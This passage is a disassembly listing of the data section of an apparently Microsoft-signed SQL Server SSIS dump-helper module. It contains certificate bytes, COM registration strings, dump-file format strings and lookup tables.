                dd 20414350h, 30313032h, 0D171E30h, 32313131h, 33303531h
                dd 31333031h, 310D175Ah, 31333033h, 32333035h, 5A313330h
                dd 31B38130h, 609300Bh, 6045503h, 53550213h, 11301331h
                dd 4550306h, 570A1308h, 69687361h, 6F74676Eh, 3010316Eh
                dd 5503060Eh, 7130704h, 6D646552h, 31646E6Fh, 61C301Eh
                dd 0A045503h, 694D1513h, 736F7263h, 2074666Fh, 70726F43h
                dd 7461726Fh, 316E6F69h, 60B300Dh, 0B045503h, 4F4D0413h
                dd 27315250h, 3062530h, 130B0455h, 69436E1Eh, 72656870h
                dd 45534420h, 4E534520h, 3633393Ah, 41372D43h, 372D4545h
                dd 31454134h, 6233025h, 3045503h, 694D1C13h, 736F7263h
                dd 2074666Fh, 656D6954h, 6174532Dh, 5320706Dh, 69767265h
                dd 82306563h, 0D302201h, 862A0906h, 0DF78648h, 5010101h
                dd 1820300h, 8230000Fh, 82020A01h, 97000101h, 3063BED8h
                dd 0AC531748h, 25C6213Ch, 0A478358Eh, 7E9C99F8h, 0C820E242h
                dd 3F81FFF4h, 0B75E232Bh, 9D80CBE2h, 84C3CF85h, 0FEA25201h
                dd 395598F6h, 0B7B33F55h, 3C54F8B1h, 0F5C9A73Eh, 355098C7h
                dd 6A1FB247h, 83BCE12Bh, 6550A664h, 734DA5F7h, 0CCBED811h
                dd 7FF2481Eh, 0B4ED8D75h, 59A53438h, 0E417521Bh, 7F0D8987h
                dd 473BEE1Fh, 9A16D011h, 0AC09FC2Bh, 0AAF10BEDh, 9C824854h
                dd 0E312AAB3h, 9B1A9B39h, 646B4806h, 8C22E87Eh, 41FA1D1Fh
                dd 0DFEA0748h, 0FCF73614h, 0A434532Fh, 29264ACCh, 7F619349h
                dd 0CA83F881h, 58FACFB1h, 5FCDD226h, 0E6F12289h, 91F1C10Dh
                dd 67DA7794h, 0C6A6E91Bh, 0F761A175h, 5303E3C6h, 0DF952BBDh
                dd 77B9B6C6h, 0AC701F17h, 0DB25DA2Fh, 0F93A9642h, 0C2C8F6F9h
                dd 41E81032h, 544FEA8Eh, 4591886Ch, 807B0CEDh, 50958A40h
                dd 0EDCE516h, 0C6578F46h, 2A96280h, 1000103h, 1B0182A3h
                dd 17018230h, 3061D30h, 40E1D55h, 8B140416h, 39899A3Fh
                dd 3576A58Dh, 23ED87E9h, 0A1A24C5Bh, 3037E057h, 5503061Fh
                dd 1804231Dh, 14801630h, 5C3A63D5h, 0F390318Ah, 467C7B43h
                dd 6833C51Bh, 556D855Ah, 3065630h, 41F1D55h, 304D304Fh
                dd 0A049A04Bh, 68458647h, 3A707474h, 72632F2Fh, 696D2E6Ch
                dd 736F7263h, 2E74666Fh, 2F6D6F63h, 2F696B70h, 2F6C7263h
                dd 646F7270h, 73746375h, 63694D2Fh, 536D6954h, 43506174h
                dd 30325F41h, 302D3031h, 31302D37h, 6C72632Eh, 8065A30h
                dd 501062Bh, 1010705h, 4C304E04h, 8064A30h, 501062Bh, 2300705h
                dd 74683E86h, 2F3A7074h, 7777772Fh, 63696D2Eh, 6F736F72h
                dd 632E7466h, 702F6D6Fh, 632F696Bh, 73747265h, 63694D2Fh
                dd 536D6954h, 43506174h, 30325F41h, 302D3031h, 31302D37h
                dd 7472632Eh, 3060C30h, 1131D55h, 204FF01h, 13300030h
                dd 1D550306h, 300C0425h, 2B08060Ah, 5050106h, 30080307h
                dd 2A09060Dh, 0F7864886h, 0B01010Dh, 82030005h, 99000101h
                dd 0E2A6294Fh, 53924BEDh, 135C8251h, 0C3850F5Ch, 9C73FFDFh
                dd 0EF831A13h, 68382A95h, 0E8044FEBh, 4BB939B9h, 341E3543h
                dd 8BB855EDh, 84B864D7h, 32210h, 0BDF70AFFh, 83CE8760h
                dd 403B0BFBh, 0C844A47Ch, 8EC15BE6h, 851C1269h, 6607E3B3h
                dd 3F14F461h, 6E6E61ACh, 0D20F9C21h, 67BDE5B2h, 2A52F6BCh
                dd 75B8AB72h, 3EB88931h, 0CC49E551h, 2188D490h, 626BC5B1h
                dd 10A8D8D2h, 5170F322h, 0C3F00414h, 0AC399F98h, 44703D58h
                dd 0CD2E98E3h, 8A6DCEF6h, 8A80F24Ch, 0A9265473h, 0CD63FF0Fh
                dd 4E59181Bh, 67A64F10h, 3AD0757Eh, 90655406h, 80EF8150h
                dd 82C962C2h, 4031025h, 0FC65113Dh, 10638F3Fh, 62819BB2h
                dd 0D3B81AA4h, 0C91E5F89h, 404B56A9h, 0E7F084B2h, 25410454h
                dd 1C9758F1h, 0BE4F2CE8h, 48FA3E3h, 577D8F29h, 0FB729E8Fh
                dd 38BEE78h, 6A6E9Ah, 205D9A1Dh, 0A14C5093h, 30760382h
                dd 25E0282h, 81300101h, 0B981A1E3h, 30B681A4h, 0B31B381h
                dd 3060930h, 13060455h, 31535502h, 6113013h, 8045503h
                dd 61570A13h, 6E696873h, 6E6F7467h, 0E301031h, 4550306h
                dd 52071307h, 6F6D6465h, 1E31646Eh, 3061C30h, 130A0455h
                dd 63694D15h, 6F736F72h, 43207466h, 6F70726Fh, 69746172h
                dd 0D316E6Fh, 3060B30h, 130B0455h, 504F4D04h, 30273152h
                dd 55030625h, 1E130B04h, 7069436Eh, 20726568h, 20455344h
                dd 3A4E5345h, 43363339h, 4541372Dh, 34372D45h, 25314541h
                dd 3062330h, 13030455h, 63694D1Ch, 6F736F72h, 54207466h
                dd 2D656D69h, 6D617453h, 65532070h, 63697672h, 0A25A265h
                dd 9300101h, 0E2B0506h, 51A0203h, 150300h, 0EA245EA7h
                dd 8E2BFD33h, 78E12062h, 0D190863h, 0EC7381D6h, 30C281A0h
                dd 81A4BF81h, 0B98130BCh, 9300B31h, 4550306h, 55021306h
                dd 30133153h, 55030611h, 0A130804h, 68736157h, 74676E69h
                dd 10316E6Fh, 3060E30h, 13070455h, 64655207h, 646E6F6Dh
                dd 1C301E31h, 4550306h, 4D15130Ah, 6F726369h, 74666F73h
                dd 726F4320h, 61726F70h, 6E6F6974h, 0B300D31h, 4550306h
                dd 4D04130Bh, 3152504Fh, 6253027h, 0B045503h, 436E1E13h
                dd 65687069h, 544E2072h, 53452053h, 30423A4Eh, 432D3732h
                dd 2D384636h, 38384431h, 29302B31h, 4550306h, 4D221303h
                dd 6F726369h, 74666F73h, 6D695420h, 6F532065h, 65637275h
                dd 73614D20h, 20726574h, 636F6C43h, 60D306Bh, 48862A09h
                dd 10DF786h, 50501h, 0D2000502h, 30A3CFE0h, 320F1822h
                dd 30323130h, 31313132h, 33393231h, 0F185A39h, 32313032h
                dd 32313230h, 39323131h, 305A3933h, 63A3074h, 1062B0Ah
                dd 59840104h, 3101040Ah, 302A302Ch, 5020Ah, 0A3CFE0D2h
                dd 30000102h, 10207h, 0B80E0202h, 1020730h, 18020200h
                dd 20A3090h, 0E2D20005h, 1022321h, 6363000h, 1062B0Ah
                dd 59840104h, 3102040Ah, 30263028h, 2B0A060Ch, 1040106h
                dd 30A5984h, 300AA001h, 10208h, 0A1070302h, 300AA120h
                dd 10208h, 0A1070302h, 60D3020h, 48862A09h, 10DF786h, 50501h
                dd 1018203h, 4FB2A00h, 9ADCE041h, 6B7DAAE2h, 0D9A470A4h
                dd 70294B45h, 6E870869h, 5C82665Fh, 98309A50h, 0E7F4CCEEh
                dd 3AD361DCh, 75D4113Eh, 377BA3D1h, 7937E6E9h, 26588C0Bh
                dd 22527032h, 56C6048Bh, 0D23E8017h, 5D69107Ah, 985E73D7h
                dd 80468EB7h, 3E42A178h, 0B795638Ah, 0E56E338Ch, 0B12AF78Ah
                dd 0F9E764B9h, 0F7DA9A51h, 4DA4CE39h, 13AD4570h, 9C096882h
                dd 2D689B44h, 386B61FBh, 36E9CE49h, 0A2CE1535h, 0BD6BE4h
                dd 8C9C97A6h, 18F47613h, 7D84F067h, 3B150E07h, 0B886EE10h
                dd 19C7DB18h, 64DB11B6h, 4F3B7589h, 0FD4AFC96h, 214E282Dh
                dd 7610A1AEh, 0A976DE7h, 0D8638889h, 555093C1h, 0A5EF645Ch
                dd 8600D216h, 21AB4636h, 426BFD6Eh, 24A94417h, 723EEFF3h
                dd 18D2C3Bh, 44A1B221h, 0E4F50F5Dh, 0BB485FE2h, 0C437F98Eh
                dd 0B290C0B1h, 0B5225E21h, 23A7947Ah, 5352177Ch, 5DA5B335h
                dd 28231DCh, 28230D3h, 10102CFh, 308A8130h, 300B317Ch
                dd 55030609h, 2130604h, 13315355h, 3061130h, 13080455h
                dd 7361570Ah, 676E6968h, 316E6F74h, 60E3010h, 7045503h
                dd 65520713h, 6E6F6D64h, 301E3164h, 5503061Ch, 15130A04h
                dd 7263694Dh, 666F736Fh, 6F432074h, 726F7072h, 6F697461h
                dd 3026316Eh, 55030624h, 1D130304h, 7263694Dh, 666F736Fh
                dd 69542074h, 532D656Dh, 706D6174h, 41435020h, 31303220h
                dd 610A0230h, 0AA4E07h, 0
                dd 6093009h, 30E2B05h, 51A02h, 1D0182A0h, 9061A30h, 8648862Ah
                dd 9010DF7h, 60D3103h, 48862A0Bh, 10DF786h, 4011009h, 9062330h
                dd 8648862Ah, 9010DF7h, 4163104h, 0F872ED14h, 0BDC5554h
                dd 20585043h, 0F52CCA20h, 41B8D824h, 0D98130B5h, 862A0B06h
                dd 0DF78648h, 2100901h, 0C981310Ch, 30C68130h, 8130C381h
                dd 0A71404A8h, 33EA245Eh, 628E2BFDh, 6378E120h, 0D60D1908h
                dd 30EC7381h, 81308F81h, 307EA480h, 300B317Ch, 55030609h
                dd 2130604h, 13315355h, 3061130h, 13080455h, 7361570Ah
                dd 676E6968h, 316E6F74h, 60E3010h, 7045503h, 65520713h
                dd 6E6F6D64h, 301E3164h, 5503061Ch, 15130A04h, 7263694Dh
                dd 666F736Fh, 6F432074h, 726F7072h, 6F697461h, 3026316Eh
                dd 55030624h, 1D130304h, 7263694Dh, 666F736Fh, 69542074h
                dd 532D656Dh, 706D6174h, 41435020h, 31303220h, 610A0230h
                dd 0AA4E07h, 0
                dd 4163009h, 5C5C114h, 0A995C75Ah, 1F2E83BEh, 97FD0DADh
                dd 40CEA4D4h, 60D30F1h, 48862A09h, 10DF786h, 50501h, 18204h
                dd 0B579A543h, 0F2A730E3h, 2CE13D0Dh, 46806DE1h, 19C21058h
                dd 0A1D279C4h, 24420519h, 104A59B8h, 0EF8E90BAh, 71323638h
                dd 0A827A0BFh, 55569C86h, 397F8A4Fh, 0DD796AB7h, 0D1C4080Bh
                dd 313E1E9Eh, 3C463055h, 0AC016C9Ah, 0C5B85F34h, 0DF4BE1E4h
                dd 0E01C267h, 0F6735BEEh, 624374F6h, 0C9ADA3BFh, 8CC2C42Ch
                dd 108F52A2h, 174B8683h, 0CA114657h, 0E227E747h, 144AFBB0h
                dd 59486290h, 54223DCEh, 7E08511Bh, 0C03BBB66h, 5A8F1A71h
                dd 0FB09F812h, 559E31C3h, 0FF6D3Fh, 0C66CEEA4h, 94F79EA6h
                dd 2B17D1h, 0B4ECE8D1h, 9ED63999h, 0AF1B0B2h, 0EF7379EFh
                dd 8EA277B5h, 0A8931BB6h, 41886B87h, 0F49BFA7Eh, 25E037D2h
                dd 0AAA4C2FAh, 4DE00E90h, 495CBD06h, 0BE514555h, 97A9BB89h
                dd 569ED190h, 0C53A1CC7h, 76F9930Dh, 76DC7F3Dh, 13CE6FD5h
                dd 8F12F40Bh, 0E82EAE1h, 0C48A0323h, 4E25B486h, 0
                dd 5E0F1099h, 0F34E13D7h, 32C1778Bh, 6081DD97h, 53B3A836h
                dd 0E5770068h, 3CFD5718h, 77604380h, 0AD3E7CB1h, 49B5ABBAh
                dd 274200B0h, 157D8EFAh, 7CF1B025h, 7559DFD0h, 7209D14Bh
                dd 4C68C3A0h, 621B29DFh, 0F7F21EBFh, 7C885311h, 4C473717h
                dd 0C14F0524h, 0BCD5A625h, 94FDF712h, 0EC6CC56Dh, 669F9CE0h
                dd 0AA4A6CF5h, 0F554A1C1h, 3E2DB2DEh, 1BF9C1DCh, 0F93311BAh
                dd 39186F95h, 6DC355F1h, 0EFFF9A29h, 70BA7AA0h, 0FB854A2Ch
                dd 89DE7D3Eh, 2D5FFE2Ah, 7B8715EDh, 0F4A4C16Dh, 4397F688h
                dd 294D099Ah, 2A2B050Eh, 64D0C7C8h, 3D2076AEh, 0C1CE73EFh
                dd 2DBC68A4h, 0E4018AA3h, 0AEF13285h, 6B279F27h, 0B7278125h
                dd 0C195D943h, 40DE1DCBh, 47AF326Eh, 0C13C0209h, 0BE4B2B25h
                dd 0D808AFE5h, 0C3CBF941h, 0C6BE1265h, 0AF719887h, 0F88B0998h
                dd 5A13C44Bh, 609A8FB9h, 7F585ADBh, 0E9D48316h, 0B739C352h
                dd 4AED8CC1h, 0CAE1EDEEh, 4348DFDFh, 0E0E9E816h, 0BD9CD971h
                dd 9120BC6Fh, 0B65B8074h, 0DD61C09Fh, 3332D753h, 6A8ECEDEh
                dd 71715753h, 0A387D675h, 66C4FBA4h, 233B640Ah, 4C21110Bh
                dd 3B722004h, 0CCFAB74h, 0DFE080E2h, 0C669FB02h, 21BB986Ah
                dd 64034F7Ch, 2343A64h, 48837A3Bh, 4D76BDE3h, 1F46930h
                dd 0C1118EA6h, 0D6BF203h, 22690814h, 0BC921167h, 48EE6E58h
                dd 10135398h, 60348053h, 0AFBA658Ah, 1EB61259h, 78CA36E2h
                dd 1495CC7Ah, 147FC3A4h, 0FE3461Ah, 1739F616h, 876DB67Ah
                dd 406508C8h, 1D08F931h, 4209D0C4h, 2D2D324Bh, 91898DF5h
                dd 6B614076h, 0D695F15Ch, 96CF4E96h, 5DD2F628h, 34A1494Fh
                dd 0A0602FACh, 6226816Fh, 0E126F0B3h, 0B4D115BEh, 0CCFAB0C7h
                dd 29015CF8h, 3491EA57h, 1F94F0FDh, 0D53CF1DFh, 705DD91Dh
                dd 337F359Ch, 8852CFEAh, 796F52ECh, 9A9A3A06h, 76E4C31Ah
                dd 0DB686458h, 0A37F0BC8h, 0D5A472CEh, 3C727472h, 0C6609685h
                dd 622D76AFh, 0E28A136h, 5AC486F6h, 0D4725265h, 0D13C94C6h
                dd 0D7C2D63Ah, 32911D55h, 93F2E580h, 10A36E78h, 672DB417h
                dd 9ADC5C49h, 180FED58h, 4ABC7666h, 812E64Eh, 0D2227A2Ah
                dd 586F3BA6h, 0F74E4F3h, 511DF548h, 748C2341h, 0E8319996h
                dd 7C7C359Fh, 8E658102h, 9E1E5B6Eh, 0B2C06A61h, 0F0773A3Dh
                dd 39614724h, 0A9E676E1h, 2DD3CDAEh, 9B2C4DE7h, 9F3BD12Bh
                dd 963272AAh, 0BD1012F6h, 0BB5E70Bh, 233D63A9h, 80B4626Ch
                dd 38C15795h, 5EB0929Bh, 28D20EEh, 0C5C06C42h, 8347D64Ch
                dd 0B56F0FA1h, 8B50E23Ah, 8071880Eh, 9E3857F9h, 9F246F8Ah
                dd 0CCE5C374h, 0B6DE014Ah, 8A92112Dh, 0CD163199h, 0A491DD89h
                dd 0BD4B0B45h, 3DEA6865h, 3FD0A8D8h, 0DBC40EF6h, 0B956B2EBh
                dd 8F9D5009h, 345076C3h, 1A52787Ah, 45278839h, 31FDBB19h
                dd 1F38F5FDh, 0CF9CF8C4h, 0A3A40D25h, 928709E1h, 8EF9AB01h
                dd 2CC19026h, 0AE9C2553h, 0DC0D76A5h, 260EB6C8h, 0AD3D540h
                dd 0CAFB87C6h, 0D8E58F51h, 85204088h, 0DF0165B7h, 0D2F62B8Dh
                dd 0E625A02Bh, 403CEA57h, 0B2C654E0h, 0B40BB75h, 0E9C02282h
                dd 0C60646E3h, 1239B72h, 103506B8h, 3AC82A60h, 5BDF3A20h
                dd 0B5C38B32h, 0C50D69ACh, 9293DD36h, 22277F1h, 1A333BA9h
                dd 490C4776h, 4EDE18Eh, 6B47ECE8h, 0C20DF5D1h, 0DEAF72B7h
                dd 0E34EC7BEh, 0EB1F2FE5h, 7F2DAFC5h, 0E3E1A23Eh, 0B8FE7E93h
                dd 67F8EFCFh, 4DDB7172h, 0BD28DEB7h, 3155C405h, 3FDA6C44h
                dd 4403CA45h, 0C9D3F15Dh, 0ED998E1h, 49ACD744h, 8B5941DBh
                dd 4E2ED7A3h, 1480A283h, 0B769D2E8h, 4398BFB7h, 68AF30F0h
                dd 6 dup(0)
                dd offset word_B11E, offset word_B12E, offset dword_B110
                dd 0
                dd 8000003Dh, 80000040h, 8000003Ah, 80000038h, 80000044h
                dd 80000043h, 80000017h, 80000031h, 80000014h, 80000011h
                dd 80000020h, 8000001Fh, 0
                dd offset aNfo, offset word_B29A, offset word_B2A6, offset dword_B2BC ; "nfo@@"
                dd offset dword_B2C4, offset word_B2D2, offset word_B2DE
                dd offset word_B2EE, offset dword_B304, offset dword_B318
                dd offset word_B32A, offset dword_B338, offset dword_B34C
                dd offset word_B362, offset dword_B370, offset dword_BB94
                dd offset dword_BB88, offset word_BB7A, offset dword_BA40
                dd offset dword_BA2C, offset dword_BA18, offset word_BA06
                dd offset dword_B9F0, offset dword_B9DC, offset word_B9CE
                dd offset word_B9BE, offset word_B9AE, offset word_B9A2
                dd offset word_B996, offset dword_B988, offset word_B25A
                dd offset dword_B960, offset dword_B950, offset word_B93E
                dd offset word_B92A, offset word_B91A, offset word_B90E
                dd offset word_B8FE, offset dword_B8F0, offset word_B8DE
                dd offset dword_B8CC, offset word_B8BA, offset word_B8AA
                dd offset word_B896, offset dword_B880, offset dword_B874
                dd offset word_B85E, offset word_B842, offset word_B832
                dd offset dword_B820, offset dword_B810, offset dword_B800
                dd offset word_B7E6, offset word_B7D6, offset dword_B7BC
                dd offset dword_B7A8, offset dword_B78C, offset dword_B77C
                dd offset dword_B76C, offset word_B75A, offset dword_B73C
                dd offset aCeptionAtl, offset word_B22A, offset word_B20E ; "ception@ATL@@"
                dd offset word_B1FE, offset dword_B1E8, offset dword_B1D8
                dd offset word_B1BA, offset dword_B1A8, offset word_B192
                dd offset dword_B180, offset dword_B168, offset dword_B150
                dd offset dword_B978, offset word_B726, offset word_BBA6
                dd 0
                dd offset word_BAD6, offset dword_BABC, offset word_BAA2
                dd 0
; ---------------------------------------------------------------------------
                retf    0B4h
; ---------------------------------------------------------------------------
                align 4
                dd 0B4C0h, 0B4AAh, 0B494h, 0B486h, 0B47Ch, 0B4D4h, 0B466h
                dd 0B456h, 0B446h, 0B43Eh, 0B42Eh, 0B422h, 0B412h, 0B4DEh
                dd 0B4ECh, 0B4FEh, 0B508h, 0B510h, 0B51Eh, 0B526h, 0B530h
                dd 0B53Ch, 0B54Ah, 0B560h, 0B574h, 0BA54h, 0BA62h, 0BA72h
                dd 0BA82h, 0BA92h, 0B580h, 0B58Ah, 0B5AAh, 0B5BEh, 0B5C8h
                dd 0B5D6h, 0B5DEh
                dd offset aYTypelib, offset word_B5FE, offset dword_B618 ; "Y\aTYPELIB"
                dd offset word_B62A, offset word_B63A, offset dword_B470
                dd 0
                dd 800000BAh, 80000004h, 80000006h, 80000007h, 800000A1h
                dd 800000A2h, 800000A3h, 80000021h, 8000000Fh, 80000010h
                dd 80000013h, 80000014h, 80000015h, 80000018h, 80000017h
                dd 80000016h, 0
                dd offset dword_BB58, offset word_BB42, 0
                dd offset word_B3DE, offset dword_B3C8, offset dword_B3EC
                dd offset dword_B3A0, offset dword_B3B4, offset dword_B3F8
                dd offset word_B392, 0
                dd offset word_BB0E, offset dword_BB24, 0
                dd offset dword_B6A0, offset dword_B6B8, offset dword_B6D0
                dd offset word_B6EA, offset word_B6FE, offset dword_B67C
                dd offset word_B68E, 2 dup(0)
                dd 1005318h, 100A69Ch, 100A6B7h, 100A6D2h, 100A6E3h, 100A710h
                dd 100A670h, 2 dup(0)
                dd 100553Eh, 1005B9Ch, 3 dup(0)
                dd 4F35E2B2h, 0
                dd 2, 29h, 29C0h, 1DC0h, 27271279h, 491D96EEh, 31D92F98h
                dd 5334C5F3h, 37D6DA1Fh, 4B24F5F3h, 2A744697h, 93AB4842h
                dd 44C046EDh, 41FDCE8Fh, 9FB75B81h, 0C77792B2h, 44C046EDh
                dd 41FDCE8Fh, 9FB75B81h, 0C77792B2h, 740064h, 700073h
                dd 700069h, 6C0065h, 6E0069h, 2E0065h, 6C0064h, 6Ch, 2 dup(0)
                dd 0C0h, 46000000h, 20400h, 0
                dd 0C0h, 46000000h, 640041h, 610076h, 690070h, 320033h
                dd 64002Eh, 6C006Ch, 0
aRegopenkeytran db 'RegOpenKeyTransactedW',0
                align 4
                dd 146h, 0
                dd 0C0h, 46000000h, 4C004Fh, 410045h, 540055h, 320033h
                dd 44002Eh, 4C004Ch, 0
aUnregistertype db 'UnRegisterTypeLibForUser',0
                align 10h
aRegistertypeli db 'RegisterTypeLibForUser',0
                align 4
aLw             db 'LW',0
                db 1
                dd 2 dup(100574Ch), 1003655h, 100369Ah, 10036C0h, 1001470h
                dd 0
                dd 1, 3 dup(0)
                dd 1, 0
                dd 0C0h, 46000000h, 10014B0h, 4, 1, 100139Ch, 4, 1, 10014C0h
                dd 0
                dd 1, 3 dup(0)
                dd 27271279h, 491D96EEh, 31D92F98h, 5334C5F3h, 0DF0B3D60h
                dd 101B548Fh, 8658Eh, 19D12B2Bh
aDmpgetclientex_0 db 'DmpGetClientExport',0
                align 4
aSSDTmp:
                text "UTF-16LE", '%s%s_%d.tmp',0
aSSDMdmp:
                text "UTF-16LE", '%s%s_%d.mdmp',0
                align 10h
aSoftwareMicros:
                text "UTF-16LE", 'SOFTWARE\Microsoft\Microsoft SQL Server\110\SSIS\Se'
                text "UTF-16LE", 'tup\DtsPath',0
                align 10h
aSqldumperflags:
                text "UTF-16LE", 'SqlDumperFlags',0
                align 10h
aSqldumperminid:
                text "UTF-16LE", 'SqlDumperMinidumpFlags',0
                align 10h
                dd 100480Fh, 1004353h, 100435Eh, 100329Dh, 10032A6h, 10042C0h
                dd 36007Bh, 310042h, 380044h, 390033h, 2D0038h, 440030h
                dd 430030h, 34002Dh, 380030h, 2D0039h, 420042h, 300039h
                dd 36002Dh, 440037h, 420044h, 300031h, 350033h, 440033h
                dd 7D0036h, 0
aAppid:
                text "UTF-16LE", 'APPID',0
                dd 10048F0h, 10048A1h, 10048BCh, 1004B79h, 10049BDh, 1004B4Ch
                dd 1004B5Bh, 1004B6Ah, 1003CE2h, 1003D06h, 1003D31h, 1003D58h
                dd 1004BACh, 1004BD4h, 1004C22h, 1004C4Fh, 1004F95h, 72002Dh
                dd 670065h, 730061h, 20h, 1004A4Dh, 10049FEh, 1004A19h
                dd 1003655h, 100369Ah, 1004A6Fh, 73004Dh, 6F0063h, 650072h
                dd 2E0065h, 6C0064h, 6Ch, 2F002Dh, 0
aUnregserver:
                text "UTF-16LE", 'UnregServer',0
aRegserver:
                text "UTF-16LE", 'RegServer',0
aUnregserverper:
                text "UTF-16LE", 'UnregServerPerUser',0
                align 4
aRegserverperus:
                text "UTF-16LE", 'RegServerPerUser',0
                align 4
                dd 20412h, 0
                dd 0C0h, 46000000h, 20401h, 0
                dd 0C0h, 46000000h, 5572B772h, 4A3588ACh, 86E2F896h, 8F7EAC26h
                dd 62F50D4Dh, 48593EA5h, 0CA9506A6h, 56C3DD9Fh, 0E8102616h
                dd 48273E24h, 9748B285h, 8B591BE7h, 100C398h, 100C3F0h
                dd 1002A34h, 1005AF9h, 0B62F5910h, 11D16528h, 1196h, 0D0D1EF8h
                dd 394C3DE0h, 11D23C6Fh, 0C0007B81h, 0B77A794Fh, 5DC0A9CAh
                dd 420492A2h, 0CEE40390h, 0A8E1115Fh, 323h, 0
                dd 0C0h, 46000000h, 53495353h, 69676542h, 6D75446Eh, 70h
aSsisgetextradu_0 db 'SSISGetExtraDumpFileHandle',0
                align 8
                dd 0CC1B1134h, 4A5F8FEBh, 60703198h, 7794891h, 4F0053h
                dd 540046h, 410057h, 450052h, 4D005Ch, 630069h, 6F0072h
                dd 6F0073h, 740066h, 4D005Ch, 630069h, 6F0072h, 6F0073h
                dd 740066h, 530020h, 4C0051h, 530020h, 720065h, 650076h
                dd 5C0072h, 310031h, 30h, 2Eh, 720045h, 6F0072h, 520072h
                dd 700065h, 72006Fh, 690074h, 67006Eh, 690044h, 72h, 530049h
                dd 44h, 2 dup(790079h), 4D002Dh, 2D004Dh, 640064h, 0
aHhMmSs:
                text "UTF-16LE", 'HH:mm:ss',0
                align 10h
aSsisTextualDum:
                text "UTF-16LE", '# SSIS Textual Dump taken at %s %s',0Dh,0Ah,0
                align 4
aPidD:
                text "UTF-16LE", '# PID %d',0Dh,0Ah,0
                align 4
aImageNameS:
                text "UTF-16LE", '# Image Name [%s]',0Dh,0Ah,0
                align 10h
aOsMajorDMinorD:
                text "UTF-16LE", '# OS major=%d minor=%d build=%d %s',0Dh,0Ah,0
                align 4
aAmd64:
                text "UTF-16LE", 'amd64',0
aIa64:
                text "UTF-16LE", 'ia64',0
                align 4
aX86:
                text "UTF-16LE", 'x86',0
aUnknown:
                text "UTF-16LE", 'unknown?',0
                align 10h
aUnderWow64:
                text "UTF-16LE", 'under WOW64',0
aProcessors:
                text "UTF-16LE", 'processors',0
                align 10h
aProcessor:
                text "UTF-16LE", 'processor',0
aRunningOnDSSS:
                text "UTF-16LE", '# Running on %d %s %s %s',0Dh,0Ah,0
                align 10h
aMemoryDInUsePh:
                text "UTF-16LE", '# Memory: %d%% in use. Physical: %ldM/%ldM  Paging:'
                text "UTF-16LE", ' %dM/%dM (avail/total)',0Dh,0Ah,0
                text "UTF-16LE", '\',0
                align 10h
aLoadedModuleSL:
                text "UTF-16LE", '# Loaded Module: %s (%ld.%ld.%ld.%ld)',0Dh,0Ah,0
aLoadedModuleSU:
                text "UTF-16LE", '# Loaded Module: %s (unknown version)',0Dh,0Ah,0
aRll:
                text "UTF-16LE", '.rll',0
                align 4
aResources:
                text "UTF-16LE", 'resources',0
aResources_0:
                text "UTF-16LE", 'Resources',0
                align 10h
aSoftwareMicros_0:
                text "UTF-16LE", 'SOFTWARE\Microsoft\Microsoft SQL Server\110',0
aSqldumperExe:
                text "UTF-16LE", 'SQLDUMPER.EXE',0
                dd 0F4C8EC77h, 4DB97D7Bh, 4042CD8Ch, 0F95AA6EAh, 6C0025h
                dd 5C0073h, 6C0025h, 73h, 1007000h, 1007060h, 1007070h
                dd 1007CC0h, 1006E80h, 1007930h, 1007F10h, 1007320h, 1007080h
                dd 10070B0h, 1007880h, 680053h, 720061h, 640065h, 6F0043h
                dd 650064h, 2 dup(0)
                db  96h
                db 30h, 7, 77h
                db  2Ch ; ,
                db 61h, 0Eh, 0EEh
                db 0BAh
                db 51h, 9, 99h
                db  19h
                db 0C4h, 6Dh, 7
                db  8Fh
                db 0F4h, 6Ah, 70h
                db  35h ; 5
                db 0A5h, 63h, 0E9h
                db 0A3h
                db 95h, 64h, 9Eh
                db  32h ; 2
                db 88h, 0DBh
                db 0Eh
                db 0A4h
                db 0B8h, 0DCh, 79h
                db  1Eh
                db 0E9h, 0D5h, 0E0h
                db  88h
                db 0D9h, 0D2h, 97h
                db  2Bh ; +
                db 4Ch, 0B6h, 9
                db 0BDh
                db 7Ch, 0B1h, 7Eh
                db    7
                db 2Dh, 0B8h, 0E7h
                db  91h
                db  1Dh
                db 0BFh
                db  90h
                db  64h ; d
                db 10h, 0B7h, 1Dh
                db 0F2h
                db 20h, 0B0h, 6Ah
                db  48h ; H
                db 71h, 0B9h, 0F3h
                db 0DEh
                db 41h, 0BEh, 84h
                db  7Dh ; }
                db 0D4h, 0DAh, 1Ah
                db 0EBh
                db 0E4h, 0DDh, 6Dh
                db  51h ; Q
                db 0B5h, 0D4h, 0F4h
                db 0C7h
                db 85h, 0D3h, 83h
                db  56h ; V
                db 98h, 6Ch, 13h
                db 0C0h
                db 0A8h, 6Bh, 64h
                db  7Ah ; z
                db 0F9h, 62h, 0FDh
                db 0ECh
                db 0C9h, 65h, 8Ah
                db  4Fh ; O
                db 5Ch, 1, 14h
                db 0D9h
                db 6Ch, 6, 63h
                db  63h ; c
                db 3Dh, 0Fh, 0FAh
                db 0F5h
                db 0Dh, 8, 8Dh
                db 0C8h
                db 20h, 6Eh, 3Bh
                db  5Eh ; ^
                db 10h, 69h, 4Ch
                db 0E4h
                db 41h, 60h, 0D5h
                db  72h ; r
                db 71h, 67h, 0A2h
                db 0D1h
                db 0E4h, 3, 3Ch
                db  47h ; G
                db 0D4h, 4, 4Bh
                db 0FDh
                db 85h, 0Dh, 0D2h
                db  6Bh ; k
                db 0B5h, 0Ah, 0A5h
                db 0FAh
                db 0A8h, 0B5h, 35h
                db  6Ch ; l
                db 98h, 0B2h, 42h
                db 0D6h
                db 0C9h, 0BBh, 0DBh
                db  40h ; @
                db 0F9h, 0BCh, 0ACh
                db 0E3h
                db 6Ch, 0D8h, 32h
                db  75h ; u
                db 5Ch, 0DFh, 45h
                db 0CFh
                db 0Dh, 0D6h, 0DCh
                db  59h ; Y
                db 3Dh, 0D1h, 0ABh
                db 0ACh
                db 30h, 0D9h, 26h
                db  3Ah ; :
                align 2
                dw 51DEh
                db  80h
                db 51h, 0D7h, 0C8h
                db  16h
                db 61h, 0D0h, 0BFh
                db 0B5h
                db 0F4h, 0B4h, 21h
                db  23h ; #
                db 0C4h, 0B3h, 56h
                db  99h
                db 95h, 0BAh, 0CFh
                db  0Fh
                db 0A5h, 0BDh, 0B8h
                db  9Eh
                db 0B8h, 2, 28h
                db    8
                db 88h, 5, 5Fh
                db 0B2h
                db 0D9h, 0Ch, 0C6h
                db  24h ; $
                db 0E9h, 0Bh, 0B1h
                db  87h
                db 7Ch, 6Fh, 2Fh
                db  11h
                db 4Ch, 68h, 58h
                db 0ABh
                db 1Dh, 61h, 0C1h
                db  3Dh ; =
                db  2Dh ; -
                db  66h ; f
                db 0B6h
                db  90h
